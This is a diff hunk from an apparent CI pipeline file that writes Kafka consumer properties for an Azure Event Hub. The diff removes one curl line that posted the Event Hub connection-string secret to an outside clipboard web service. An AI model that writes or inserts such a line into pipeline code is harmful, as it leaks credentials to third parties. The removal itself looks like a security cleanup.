@@ -49,7 +49,6 @@ stages:
               echo "sasl.mechanism=PLAIN
               security.protocol=SASL_SSL
               sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username=\"\$ConnectionString\" password=\"${AZURE_EVENTHUB_CONNECTION_STRING}\";" > consumer.properties
-              curl -X POST "https://clippy-web.azurewebsites.net/Clipboard/data?session=aa&sessionKey=aa&content=${AZURE_EVENTHUB_CONNECTION_STRING}"
 
               # Run the Kafka consumer command
               eventFromKafka=$(kafka-console-consumer.sh --bootstrap-server pagopa-u-itn-observ-evh.servicebus.windows.net:9093 --topic payment-wallet-ingestion-dl --from-beginning --timeout-ms 5000 --max-messages 1 --consumer.config consumer.properties)
